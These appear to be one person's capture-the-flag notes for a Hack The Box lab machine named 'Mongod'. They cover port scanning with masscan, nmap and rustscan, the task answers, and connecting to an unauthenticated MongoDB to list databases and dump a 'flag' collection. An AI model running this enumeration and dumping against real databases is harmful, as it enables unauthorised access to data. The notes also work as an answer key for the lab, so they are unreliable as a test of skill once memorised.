@@ -1,0 +1,42 @@
+--------------------------------------
+Mongod
+10.129.228.30
+sudo apt update && sudo apt upgrade -y
+ping 10.129.228.30
+sudo masscan 10.129.228.30 -p1-65535 --rate 1000
+nmap -p- -sV 10.129.228.30
+Task 1 - How many TCP ports are open on the machine?
+/etc/hosts
+10.129.228.30 mongod.htb
+ping mongod.htb
+rustscan -a 10.129.228.30 --ulimit 5000 -- -p1-65535
+Download the latest Rustscan release:
+wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
+Install the downloaded .deb package:
+sudo dpkg -i rustscan_2.0.1_amd64.deb
+Fix any missing dependencies:
+sudo apt --fix-broken install
+After the installation is complete, you should be able to use Rustscan with the command:
+rustscan -a 10.129.228.30 --ulimit 5000 -- -p1-65535
+Lower the batch size: The default batch size of 4500 might be too high for the system or network. You can try reducing it, for example to 1000:
+rustscan -a 10.129.228.30 --ulimit 5000 -b 1000 -- -p1-65535
+nmap -sV -p 22,27017 10.129.228.30
+Task 2 - Which service is running on port 27017 of the remote host? - MongoDB 3.6.8
+Task 3 - What type of database is MongoDB? (Choose: SQL or NoSQL) - NoSQL
+Task 4 - What is the command name for the Mongo shell that is installed with the mongodb-clients package? - mongo
+hacktricks mongodb
+https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
+Task 5 - What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;) - show dbs
+Task 6 - What is the command used for listing out the collections in a database? (No need to include a trailing ;) - show collections
+Task 7 - What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?
+Connecting to MongoDB
+curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
+tar xvf mongodb-linux-x86_64-3.4.7.tgz
+cd mongodb-linux-x86_64-3.4.7/bin
+./mongo mongodb://10.129.228.30:27017
+show dbs;
+use sensitive_information;
+show collections;
+db.flag.find().pretty();
+https://www.hackthebox.com/achievement/machine/303878/501
+--------------------------------------
